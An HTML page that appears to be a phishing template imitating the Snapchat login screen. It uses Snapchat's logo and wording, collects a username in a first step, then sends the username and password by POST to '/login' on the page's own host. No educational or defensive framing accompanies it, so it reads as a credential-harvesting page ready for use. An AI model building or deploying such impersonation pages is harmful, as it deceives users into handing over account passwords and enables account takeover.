<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Snapchat Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style> body { font-family: ui-sans-serif, system-ui; } </style>
</head>
<body class="flex items-center justify-center min-h-screen bg-gray-100 p-4">
  <div id="card" class="bg-white w-full max-w-sm rounded-lg shadow-lg p-6 text-center">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
         alt="Snapchat Ghost" class="mx-auto mb-4 h-12 w-12">
    <div id="step1">
      <h1 class="text-xl font-semibold mb-4">Log in to Snapchat</h1>
      <form onsubmit="goToStep2(event)">
        <input id="inputEmail" type="text" name="username"
               placeholder="Username or Email"
               class="w-full mb-4 px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required />
        <button type="submit"
                class="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 rounded-md">Next</button>
      </form>
      <p class="mt-4 text-sm text-blue-600 hover:underline cursor-pointer">Use phone number instead</p>
    </div>
    <div id="step2" class="hidden">
      <h1 class="text-xl font-semibold mb-4">Enter your password</h1>
      <form action="/login" method="POST">
        <input type="hidden" name="username" id="hiddenUsername" />
        <input type="password" name="password"
               placeholder="Password"
               class="w-full mb-4 px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required />
        <div class="text-right mb-4">
          <a href="#" class="text-sm text-blue-600 hover:underline">Forgot your password?</a>
        </div>
        <button type="submit"
                class="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 rounded-md">Log In</button>
      </form>
    </div>
  </div>

  <script>
    function goToStep2(e) {
      e.preventDefault();
      const val = document.getElementById('inputEmail').value;
      document.getElementById('hiddenUsername').value = val;
      document.getElementById('step1').classList.add('hidden');
      document.getElementById('step2').classList.remove('hidden');
    }
  </script>
</body>
  </html>
